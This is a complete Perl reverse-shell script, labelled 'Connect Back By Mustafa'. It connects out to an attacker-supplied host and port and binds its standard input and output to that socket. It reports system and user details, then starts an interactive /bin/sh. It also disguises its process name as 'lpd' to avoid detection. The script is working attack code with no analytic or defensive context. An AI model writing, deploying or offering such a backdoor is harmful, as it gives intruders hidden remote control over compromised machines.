#!/usr/bin/perl
use Socket;
$lihat="\n=================================\nConnect Back By Mustafa\n=================================\n\n";
$cmd= "lpd";
$system= 'echo "`uname -a`";echo "`id`";/bin/sh -i';
$0=$cmd;
$target=$ARGV[0];
$port=$ARGV[1];
$iaddr=inet_aton($target) || die("Error: $!\n");
$paddr=sockaddr_in($port, $iaddr) || die("Error: $!\n");
$proto=getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
print STDOUT $lihat;
system($system);
close(STDIN);
close(STDOUT);
close(STDERR)
